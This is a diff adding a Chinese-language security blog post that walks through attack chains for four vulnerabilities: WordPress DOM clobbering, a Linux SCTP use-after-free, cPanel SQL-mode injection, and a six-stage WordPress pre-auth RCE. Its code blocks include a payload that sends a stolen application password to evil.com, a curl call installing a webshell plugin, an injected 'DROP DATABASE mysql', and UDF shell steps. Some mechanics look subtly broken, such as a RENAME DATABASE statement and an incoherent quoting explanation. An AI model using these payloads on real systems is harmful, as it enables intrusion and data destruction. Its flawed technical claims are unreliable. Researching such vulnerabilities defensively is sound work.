@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>信任与身份四重崩塌：DOM Clobbering RCE、SCTP UAF、SQL模式注入、WordPress攻击链 — DARKSEC</title>
+<meta name="description" content="CVE-2026-64638 WordPress DOM Clobbering→App Password→RCE、CVE-2026-64564 SCTP身份不匹配UAF、CVE-2026-58048 cPanel SQL模式注入、wp2shell多阶段攻击链">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 信任与身份错配</div>
+        <h1>信任与身份四重崩塌：DOM Clobbering RCE、SCTP UAF、SQL模式注入、WordPress攻击链 🐱⚡</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-08</span>
+          <span>⏱ 25 min read</span>
+          <span>🏷 DOM Clobbering / SCTP / SQL注入 / WordPress / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：当「谁」和「什么」搞混了</a></li>
+            <li><a href="#dom-clobber">CVE-2026-64638：DOM Clobbering→App Password窃取→RCE</a></li>
+            <li><a href="#sctp-uaf">CVE-2026-64564：SCTP协议身份不匹配→UAF→LPE</a></li>
+            <li><a href="#sql-mode">CVE-2026-58048：SQL会话模式切换→注入绕过→RCE</a></li>
+            <li><a href="#wp2shell">wp2shell：SQL→缓存投毒→对象伪造→身份劫持→RCE六阶段链</a></li>
+            <li><a href="#patterns">攻击模式提炼：身份错配的四重奏</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：当「谁」和「什么」搞混了 ⚡</h2>
+        <p>今天分析的四枚漏洞有一个共同的元模式——<strong>「检查阶段使用了错误的身份标识符」</strong>。DOM Clobbering让浏览器的命名属性映射劫持了JS全局变量；SCTP内核用源IP校验但用地址参数执行删除；cPanel的SQL模式改变了解析器的语义；wp2shell用缓存投毒让WordPress的身份系统自相矛盾。它们不是传统的内存破坏或注入——而是<strong>系统对「操作对象」的认定与实际执行对象之间的错位</strong> nya~ 🐾</p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：DOM Clobbering让<code>&lt;area id=ajaxurl&gt;</code>劫持了<code>window.ajaxurl</code>——HTML规范的named property映射是合法功能，但在安全上下文中变成了攻击向量；SCTP用源IP做认证但用Address Parameter做操作——18年来没人注意到这两个字段可以不同；cPanel在root权限下执行RENAME DATABASE且未隔离sql_mode——高权限操作+SQL模式切换=完美风暴；wp2shell用6个CVE串联成一条从pre-auth到RCE的完整链——单独看每个CVE都是中等风险，组合起来CVSS 10.0。</p>
+        </blockquote>
+
+        <h2 id="dom-clobber">CVE-2026-64638：DOM Clobbering→App Password窃取→RCE 🕸️</h2>
+
+        <h3>漏洞概述</h3>
+        <p>WordPress wp-login.php将登录失败的用户名<strong>不加HTML编码</strong>直接反射到error message中。攻击者构造<code>&lt;area id=ajaxurl href=attacker.com&gt;</code>——HTML规范要求浏览器将元素的<code>id</code>/<code>name</code>属性映射为<code>window</code>上的全局变量（named property映射）——<strong>DOM Clobbering</strong>劫持了wp-admin JS中引用的<code>window.ajaxurl</code>。JS自动向攻击者URL发起请求，重定向受害者到<code>authorize-application.php</code>的<code>success_url</code>，Application Password通过URL泄露给攻击者。攻击者获得Basic Auth后调用REST API安装webshell → RCE。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 阶段1: DOM Clobbering注入
+# wp-login.php将用户名原样反射到error message（无HTML编码）
+username = '&lt;area id=ajaxurl href="https://evil.com/api"&gt;'
+# → 浏览器执行named property映射
+# → window.ajaxurl = "https://evil.com/api"
+# → wp-admin的JS自动向evil.com发起请求
+
+# 阶段2: Application Password授权劫持
+# payload中包含自动提交表单，重定向到:
+# /wp-admin/authorize-application.php?success_url=https://evil.com/callback
+# → 受害者确认授权 → Application Password通过fragment泄露
+
+# 阶段3: REST API → RCE
+curl -u "admin:xxxx xxxx xxxx xxxx xxxx xxxx" \
+  -X POST "https://target.com/wp-json/wp/v2/plugins" \
+  -d '{"plugin":"malicious-webshell","status":"active"}'
+
+# 核心洞察:
+# DOM Clobbering ≠ XSS → 它是HTML规范的合法行为
+# Application Password是WordPress内置的"合法后门"
+# success_url参数在OAuth/授权流程中普遍存在但验证缺失</code></pre>
+
+        <h3>审计要点</h3>
+        <blockquote>
+          <p>🎯 在所有login/error页面注入HTML标签 → 检查是否被反射 → 测试<code>&lt;area&gt;</code>/<code>&lt;form&gt;</code>/<code>&lt;a&gt;</code>等可创建named property的元素 → 找到引用了全局JS变量的代码 → 测试Application Password/OAuth的success_url劫持</p>
+        </blockquote>
+
+        <h2 id="sctp-uaf">CVE-2026-64564：SCTP协议身份不匹配→UAF→LPE 🐧</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Linux内核SCTP ASCONF DEL-IP处理中的<strong>身份不匹配</strong>：验证删除请求合法性时用<strong>数据包源IP地址</strong>做校验（「请求来自合法peer吗？」），但执行删除操作时用<strong>ASCONF Address Parameter中的IP地址</strong>定位transport。攻击者构造特殊ASCONF chunk → 源地址校验通过 → Address Parameter指向不存在的transport → 内核fallback遍历 → 0.0.0.0匹配通配符 → 删除不应删除的transport → 释放后association保留悬空指针 → UAF → LPE。此漏洞存活<strong>18年</strong>（Linux 2.6.25起）。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># SCTP ASCONF DEL-IP 处理流程（漏洞版本）
+
+# 正常流程:
+# 1. 收到ASCONF chunk
+# 2. 检查: src_addr == association.peer_addr? ✅ (用源IP校验)
+# 3. 提取: del_ip = ASCONF.Address_Parameter (用参数中的IP)
+# 4. 查找: transport = find_transport(del_ip)
+# 5. 删除: list_del(transport) → free
+
+# 攻击流程:
+# 构造ASCONF chunk:
+#   [Address Parameter: L(受害transport IP)]
+#   [DEL-IP: L]
+#   [DEL-IP: 0.0.0.0]
+#
+# Step 2: src_addr校验通过（数据包来自合法peer）✅
+# Step 3: del_ip = 0.0.0.0
+# Step 4: find_transport(0.0.0.0) → 不精确匹配 → fallback遍历
+#         → 0.0.0.0匹配通配符 → 返回primary_path transport
+# Step 5: 删除了不该删除的transport！
+# Step 6: association.primary_path → 悬空指针 → UAF → LPE
+
+# 核心洞察:
+# 「检查的对象」≠「操作的对象」→ 这是协议栈最隐蔽的逻辑漏洞
+# 18年无人发现 → 内核网络协议栈的身份逻辑验证极度缺乏
+# CAP_NET_ADMIN在现代容器中默认可获得 → 容器逃逸路径</code></pre>
+
+        <h3>审计要点</h3>
+        <blockquote>
+          <p>🎯 找到内核网络协议栈中所有<code>lookup</code>/<code>find</code>/<code>match</code>函数 → 交叉验证匹配键与认证阶段的身份标识 → 寻找不一致 → 如果存在两种不同的匹配方式，尝试构造一个通过一种验证、通过另一种定位到不同对象的payload</p>
+        </blockquote>
+
+        <h2 id="sql-mode">CVE-2026-58048：SQL会话模式切换→注入绕过→RCE 💉</h2>
+
+        <h3>漏洞概述</h3>
+        <p>cPanel数据库重命名功能在MySQL root权限下执行<code>RENAME DATABASE</code>操作。攻击者首先通过<code>SET sql_mode='ANSI_QUOTES'</code>改变SQL解析模式——在ANSI_QUOTES下双引号被视为标识符引号而非字符串引号——这改变了注入payload的解析方式。攻击者在新数据库名中注入恶意SQL → 以MySQL root权限运行 → UDF提权 → 系统RCE。</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 默认sql_mode下，双引号是字符串引号:
+RENAME DATABASE old_db TO "new_db"
+# → "new_db" = 字符串值 → 正常重命名
+
+# 攻击者先注入:
+SET sql_mode='ANSI_QUOTES';
+
+# 然后:
+RENAME DATABASE old_db TO "new_db\"; DROP DATABASE mysql; --"
+# ANSI_QUOTES下:
+# "new_db" → 标识符 new_db
+# ; → 语句分隔符
+# DROP DATABASE mysql; → 新语句！以root权限执行！
+# -- → 注释掉剩余部分
+
+# UDF提权（概念）:
+# 1. SELECT @@plugin_dir → 找到插件目录
+# 2. SELECT 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/shell.so'
+# 3. CREATE FUNCTION sys_exec RETURNS STRING SONAME 'shell.so'
+# 4. SELECT sys_exec('id') → RCE
+
+# 核心洞察:
+# SQL模式是SQL注入防御的盲区——WAF基于默认模式设计
+# 数据库管理操作天然是高权限的——注入直接获得高权限
+# 这是「配置即代码」的攻击面——SET语句改变了执行环境</code></pre>
+
+        <h3>审计要点</h3>
+        <blockquote>
+          <p>🎯 搜索所有执行数据库管理操作的代码（RENAME/CREATE/ALTER/DROP）→ 检查参数是否来自用户输入 → 测试能否注入<code>SET sql_mode</code> → 测试多语句执行权限 → 注意：PostgreSQL的<code>SET session_replication_role</code>和MSSQL的<code>SET QUOTED_IDENTIFIER</code>也是同类攻击面</p>
+        </blockquote>
+
+        <h2 id="wp2shell">wp2shell：SQL→缓存投毒→对象伪造→身份劫持→RCE 🐱‍👤</h2>
+
+        <h3>漏洞概述</h3>
+        <p>wp2shell是WordPress pre-auth RCE的<strong>六阶段攻击链方法论</strong>，由CVE-2026-63030（路由混淆）+ CVE-2026-60137（SQL注入）等组成。每一阶段的输出被设计为下一阶段的合法输入——整条链条在WordPress的正常功能范围内运行。单独看每个CVE都是中等或低危，组合起来<strong>CVSS 10.0</strong>。</p>
+
+        <h3>六阶段攻击链</h3>
+        <pre><code># ═══ 阶段1: 路由混淆 (CVE-2026-63030) ═══
+# /wp-json/batch/v1 的 $matches 和 $validation 数组
+# 因 continue 语句不同步 → 子请求被分配到错误的handler
+# → 绕过auth检查和方法白名单
+
+# ═══ 阶段2: SQL注入 (CVE-2026-60137) ═══
+# 由于路由混淆，author_exclude 标量字符串绕过验证
+# → 直接进入WP_Query的SQL拼接
+# → UNION注入 → 返回攻击者构造的假WP_Post对象
+
+# ═══ 阶段3: 内存缓存投毒 ═══
+# 假WP_Post对象写入WP_Object_Cache（进程内内存缓存）
+# 假对象中的 [embed] shortcode 触发oEmbed请求
+# → 创建真实的 oembed_cache 数据库行
+# → 将内存中的假对象固化到数据库
+
+# ═══ 阶段4: Changeset身份劫持 ═══
+# SQL注入伪造 customize_changeset post
+# post_content JSON中包含 "user_id": 1
+# → wp_update_post() 时保留攻击者payload
+# → 应用changeset → 临时被认定为admin身份
+
+# ═══ 阶段5: Hook重入 ═══
+# 伪造状态为 parse、类型为 request 的post
+# → 触发 parse_request hook
+# → 以当前(admin)身份重新处理整批请求
+# → POST /wp/v2/users 创建新管理员账户
+
+# ═══ 阶段6: RCE ═══
+# 以新管理员登录 → 上传恶意插件 → exec命令
+
+# 核心洞察:
+# 内存缓存 = 持久化的假象（oEmbed cache+DB固化）
+# Hook/事件系统 = 任意代码执行的调度器
+# 攻击链工程：每阶段输出故意设计为下阶段的合法输入</code></pre>
+
+        <h3>审计要点</h3>
+        <blockquote>
+          <p>🎯 不是找单个漏洞，而是<strong>绘制完整数据流图</strong> → 标注每个阶段的数据是什么、被谁消费 → 寻找「输出A恰是输入B」的相邻阶段 → 连接成链。这种多阶段攻击链在所有使用「路由→缓存→事件系统」架构的CMS中都可能存在（Drupal、Joomla、Magento）。</p>
+        </blockquote>
+
+        <h2 id="patterns">攻击模式提炼：身份错配的四重奏 🎵</h2>
+
+        <h3>四类身份错配</h3>
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:600;">🔐 DOM Clobbering</td>
+            <td style="padding:8px;">HTML规范的named property映射让<code>&lt;area id=ajaxurl&gt;</code>劫持了<code>window.ajaxurl</code>——浏览器认为这是合法的DOM操作，JS认为这是可信的配置URL</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:600;">🐧 协议身份不匹配</td>
+            <td style="padding:8px;">内核用源IP做认证（「来自谁？」），用Address Parameter做操作（「删哪个？」）——两个字段可以不同，18年无人发现</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:600;">💉 SQL模式语义切换</td>
+            <td style="padding:8px;"><code>SET sql_mode</code>改变了SQL解析器对引号的语义——WAF基于默认模式设计规则，但实际解析已改变</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;font-weight:600;">🐱‍👤 缓存固化伪造身份</td>
+            <td style="padding:8px;">内存缓存中的假对象通过oEmbed cache被固化到数据库——缓存从volatile变成persistent，身份从伪造变成「合法」</td>
+          </tr>
+        </table>
+
+        <h3>防御思路</h3>
+        <pre><code># 1. DOM Clobbering防御
+# - 错误信息中的用户输入必须做上下文感知编码
+# - HTML body context和attribute context需要不同转义策略
+# - JS代码中避免依赖window全局变量（用模块化+const）
+
+# 2. 协议身份匹配防御
+# - 审计所有lookup/find函数，验证匹配键与认证键一致
+# - 禁用不需要的内核模块（如SCTP）
+# - 容器中限制CAP_NET_ADMIN
+
+# 3. SQL模式注入防御
+# - 禁止在用户输入前执行SET语句
+# - 数据库管理操作使用预编译语句
+# - 限制multi-statement执行权限
+
+# 4. 多阶段攻击链防御
+# - 缓存中的对象必须有完整性校验
+# - Hook/事件系统必须验证触发者的身份
+# - REST API的batch端点需要独立的auth检查</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">DOM Clobbering</span>
+          <span class="tag">SCTP</span>
+          <span class="tag purple">SQL注入</span>
+          <span class="tag yellow">WordPress</span>
+          <span class="tag">UAF</span>
+          <span class="tag pink">CVE</span>
+        </div>
+
+        <p style="text-align:center;margin-top:40px;color:var(--text-dim);font-style:italic;">~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div style="text-align:center;margin-bottom:16px;">
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+      <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+      <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+    </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
